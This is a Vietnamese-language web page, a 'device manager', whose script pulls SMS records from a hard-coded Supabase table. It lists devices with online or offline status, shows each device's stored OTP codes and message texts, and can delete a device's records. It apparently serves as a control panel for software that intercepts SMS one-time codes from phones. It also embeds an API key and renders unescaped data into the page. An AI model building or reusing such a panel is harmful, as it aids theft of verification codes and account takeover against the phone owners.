<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Device Manager</title>

<style>
body {
  background: #0f172a;
  color: white;
  font-family: Arial;
  padding: 20px;
}

.device {
  background: #1e293b;
  padding: 10px;
  margin: 8px 0;
  border-radius: 8px;
  cursor: pointer;
}

.online { border-left: 5px solid #22c55e; }
.offline { border-left: 5px solid #ef4444; }

.sms {
  margin-left: 20px;
  margin-top: 10px;
  background: #020617;
  padding: 10px;
  border-radius: 6px;
}
</style>

</head>
<body>

<h2>📱 Danh sách thiết bị</h2>
<div id="devices"></div>

<script>
const URL = "https://zxewnhxxojggatsyukif.supabase.co/rest/v1/sms";
const KEY = "sb_publishable_AGpmkNidqBHY_dnz_TRJ0g_ZarfbeQi";

let allData = [];

function load() {
  fetch(URL + "?order=created_at.desc", {
    headers: {
      "apikey": KEY,
      "Authorization": "Bearer " + KEY
    }
  })
  .then(res => res.json())
  .then(data => {
    allData = data;
    renderDevices();
  });
}

function renderDevices() {
  const container = document.getElementById("devices");
  container.innerHTML = "";

  const grouped = {};

  // gom theo device
  allData.forEach(s => {
    if (!grouped[s.device]) grouped[s.device] = [];
    grouped[s.device].push(s);
  });

  Object.keys(grouped).forEach(device => {
    const list = grouped[device];

    const lastTime = new Date(list[0].created_at);
    const now = new Date();

    const isOnline = (now - lastTime) < 120000; // 2 phút

    const div = document.createElement("div");
    div.className = "device " + (isOnline ? "online" : "offline");

    div.innerHTML = `
      <b>${device}</b>
      <br>
      ${isOnline ? "🟢 Online" : "🔴 Offline"}
      <br>
      <button onclick="deleteDevice('${device}')">🗑 Xoá</button>
    `;

    // click để mở SMS
    div.onclick = () => showSMS(device);

    container.appendChild(div);
  });
}

function showSMS(device) {
  const list = allData.filter(s => s.device === device);

  let html = "<div class='sms'>";

  list.forEach(s => {
    html += `
      <div>
        🔢 ${s.otp}<br>
        📩 ${s.content}
        <hr>
      </div>
    `;
  });

  html += "</div>";

  document.querySelectorAll(".sms").forEach(e => e.remove());
  event.currentTarget.insertAdjacentHTML("beforeend", html);
}

// xoá máy
function deleteDevice(device) {
  event.stopPropagation();

  fetch(URL + "?device=eq." + encodeURIComponent(device), {
    method: "DELETE",
    headers: {
      "apikey": KEY,
      "Authorization": "Bearer " + KEY
    }
  })
  .then(() => {
    alert("Đã xoá máy!");
    load();
  });
}

// load lần đầu
load();

// auto refresh
setInterval(load, 3000);
</script>

</body>
</html>
